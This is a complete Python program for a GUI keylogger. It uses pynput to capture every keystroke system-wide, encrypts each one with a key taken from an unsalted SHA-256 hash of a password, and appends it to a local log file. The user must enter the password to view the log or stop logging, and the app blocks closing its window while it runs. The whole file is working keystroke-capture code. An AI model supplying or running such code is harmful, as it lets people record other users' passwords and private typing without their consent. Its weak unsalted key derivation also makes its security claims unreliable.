import tkinter as tk
from tkinter import simpledialog, messagebox, scrolledtext
import threading
import os
import base64
import hashlib
from cryptography.fernet import Fernet
from pynput import keyboard

# ---------- Helper for creating encryption key from password ----------

def generate_key_from_password(password: str) -> bytes:
    """
    Generates a Fernet key (32-byte, base64 encoded) from a password using SHA-256.
    This allows dynamic password input for encryption/decryption.
    """
    sha256 = hashlib.sha256()
    sha256.update(password.encode())
    key_bytes = sha256.digest()  # 32 bytes
    return base64.urlsafe_b64encode(key_bytes)  # Fernet expects base64-encoded 32-byte key

# ---------- Main Keylogger Application Class ----------

class SecureKeyloggerApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Secure Keylogger - Password Protected")

        # Ask user to set a password at startup
        self.password = simpledialog.askstring(
            "Set Password",
            "Enter a password to protect keylogger logs and stopping:",
            show='*',
            parent=master
        )
        if not self.password:
            messagebox.showerror("Error", "Password cannot be empty. Exiting.")
            master.destroy()
            return

        # Generate encryption key from password
        self.fernet_key = generate_key_from_password(self.password)
        self.cipher = Fernet(self.fernet_key)

        # Encrypted log file path
        self.log_file_path = "keylog_encrypted.log"

        # GUI components
        self.create_widgets()

        # Running flag
        self.is_logging = True

        # Start keylogger thread (daemon—exits on program close)
        self.log_thread = threading.Thread(target=self.start_keylogger, daemon=True)
        self.log_thread.start()

        # Override window close button to require password stop
        self.master.protocol("WM_DELETE_WINDOW", self.on_close_attempt)

    def create_widgets(self):
        """Create GUI widgets and layout"""
        self.status_label = tk.Label(self.master, text="Keylogger is running. Logs are encrypted.")
        self.status_label.pack(pady=5)

        self.view_log_button = tk.Button(
            self.master,
            text="View Logs (Enter Password)",
            command=self.view_logs_prompt,
            state='normal'
        )
        self.view_log_button.pack(pady=5)

        self.stop_button = tk.Button(
            self.master,
            text="Stop Keylogger (Enter Password)",
            command=self.stop_prompt,
            state='normal'
        )
        self.stop_button.pack(pady=5)

        self.log_display = scrolledtext.ScrolledText(
            self.master, width=80, height=20, state='disabled'
        )
        self.log_display.pack(padx=10, pady=10)

    def start_keylogger(self):
        """Start listening to keyboard events and encrypt keystrokes"""
        def on_press(key):
            # Only process if logging active
            if not self.is_logging:
                return

            try:
                # Alphanumeric keys and symbols
                char = key.char
            except AttributeError:
                # Special keys (space, enter, tab etc)
                if key == keyboard.Key.space:
                    char = ' '
                elif key == keyboard.Key.enter:
                    char = '\n'
                elif key == keyboard.Key.tab:
                    char = '\t'
                else:
                    # Uppercase special keys in brackets
                    name = getattr(key, 'name', str(key))
                    char = f'[{str(name).upper()}]'

            # Encrypt the keystroke and write to file
            try:
                encrypted_data = self.cipher.encrypt(char.encode())
                with open(self.log_file_path, 'ab') as f:
                    f.write(encrypted_data + b'\n')
            except Exception as e:
                # Fail silently or log error elsewhere as needed
                pass

        # Collect keyboard events globally on all major OS
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def decrypt_log(self, password_try):
        """
        Attempt to decrypt entire log file using the provided password.
        Return decrypted logs as a string if password correct; else None.
        """
        try:
            key_try = generate_key_from_password(password_try)
            cipher_try = Fernet(key_try)

            with open(self.log_file_path, 'rb') as f:
                lines = f.readlines()

            decrypted_lines = []
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                decrypted = cipher_try.decrypt(line).decode('utf-8', errors='replace')
                decrypted_lines.append(decrypted)

            return ''.join(decrypted_lines)
        except Exception:
            return None

    def view_logs_prompt(self):
        """Prompt user for password to view decrypted logs."""
        password_try = simpledialog.askstring(
            "Password Required",
            "Enter password to view logs:",
            show='*',
            parent=self.master
        )
        if not password_try:
            return

        decrypted_log = self.decrypt_log(password_try)
        if decrypted_log is None:
            messagebox.showerror("Access Denied", "Incorrect password or corrupted log.")
            return

        # Show decrypted logs in text widget
        self.log_display.config(state='normal')
        self.log_display.delete('1.0', tk.END)
        self.log_display.insert(tk.END, decrypted_log)
        self.log_display.config(state='disabled')

    def stop_prompt(self):
        """Prompt user for password to stop keylogger."""
        password_try = simpledialog.askstring(
            "Password Required",
            "Enter password to stop keylogger:",
            show='*',
            parent=self.master
        )
        if not password_try:
            return

        if password_try == self.password:
            self.is_logging = False
            messagebox.showinfo("Stopped", "Keylogger stopped successfully.")
            self.status_label.config(text="Keylogger stopped.")
            # Disable stop button after stopping
            self.stop_button.config(state='disabled')
        else:
            messagebox.showerror("Error", "Incorrect password.")

    def on_close_attempt(self):
        """Prevent closing unless keylogger is stopped properly."""
        if self.is_logging:
            messagebox.showwarning(
                "Warning",
                "Please stop the keylogger by entering the password before closing."
            )
        else:
            self.master.destroy()

# -------------------- Main execution ---------------------------

if __name__ == "__main__":
    # Check required packages
    try:
        import tkinter
        import pynput
        import cryptography
    except ImportError:
        print("Required modules missing. Please install with:")
        print("pip install pynput cryptography")
        exit(1)

    root = tk.Tk()
    app = SecureKeyloggerApp(root)
    root.mainloop()
